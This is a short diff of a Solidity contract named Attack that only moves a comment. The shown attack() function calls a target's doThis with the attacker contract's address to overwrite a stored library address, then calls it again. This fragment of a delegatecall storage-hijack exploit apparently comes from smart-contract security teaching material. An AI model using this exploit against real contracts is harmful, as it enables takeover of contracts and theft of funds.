@@ -38,7 +38,8 @@ contract Attack {
     }
     
     function attack() public {
-        hackMe.doThis(uint(uint160(address(this)))); // override address of libre
+        // override address of libre
+        hackMe.doThis(uint(uint160(address(this)))); 
         hackMe.doThis(1); 
     }
     
